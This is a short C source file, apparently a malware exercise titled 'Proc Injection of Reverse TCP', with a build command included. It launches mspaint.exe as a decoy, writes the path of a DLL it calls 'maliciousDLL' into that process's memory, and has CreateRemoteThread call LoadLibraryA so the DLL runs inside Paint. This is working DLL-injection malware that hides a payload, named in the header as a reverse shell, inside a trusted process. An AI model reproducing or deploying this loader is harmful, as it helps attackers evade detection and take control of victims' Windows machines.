/*
    Proc Injection of Reverse TCP
    19 Jan 2025
    Eric

    To build: x86_64-w64-mingw32-gcc 02_dll_injection.c -o PaintLauncherDLL.exe -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>


char maliciousDLL[] = "C:\\update.dll";
unsigned int dll_length = sizeof(maliciousDLL) + 1;


int main(){
    STARTUPINFO si;         // declaration for startupinfo
    PROCESS_INFORMATION pi; // declaration for procinfo

    HANDLE process_handle;  // Handle for the target process
    HANDLE remote_thread;   // Handle for the remote thread
    PVOID remote_buffer;    // Buffer in the remote process

    // Initialize the STARTUPINFO structure
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    //attempt to launch the mspaint decoy process
    if(CreateProcess("C:\\Windows\\System32\\mspaint.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)){
        // Handle to kernel32 and pass it to GetProcAddress
        HMODULE kernel32_handle = GetModuleHandle("Kernel32");
        VOID *lbuffer = GetProcAddress(kernel32_handle, "LoadLibraryA");
        
        // grab proc id
        printf("Process created successfully!\n");
        printf("Process ID: %lu\n", pi.dwProcessId);
        process_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pi.dwProcessId);

        // alloc mem for the payload
        remote_buffer = VirtualAllocEx(process_handle, NULL, dll_length, (MEM_RESERVE|MEM_COMMIT), PAGE_EXECUTE_READWRITE);

        // copy payload into buffer
        WriteProcessMemory(process_handle, remote_buffer, maliciousDLL, dll_length, NULL);

        // Create a remote thread to start payload
        remote_thread = CreateRemoteThread(process_handle, NULL, 0, (LPTHREAD_START_ROUTINE)lbuffer, remote_buffer, 0, NULL);

        // clean up payload handle
        CloseHandle(process_handle);
        // clean up our decoy process
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    else{
        printf("CreateProcess failed (%lu).\n", GetLastError());
    }

    return 0;
}